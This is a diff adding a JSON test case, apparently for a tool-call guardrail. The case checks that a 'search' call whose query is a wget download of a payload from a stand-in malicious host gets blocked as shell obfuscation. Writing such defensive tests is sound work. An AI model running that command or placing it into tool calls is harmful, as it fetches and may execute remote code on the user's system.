@@ -1,0 +1,9 @@
+{
+  "toolName": "search",
+  "arguments": {
+    "query": "wget https://malware.example/payload.sh"
+  },
+  "expected": "block",
+  "category": "shell-obfuscation",
+  "ruleHint": "wget"
+}
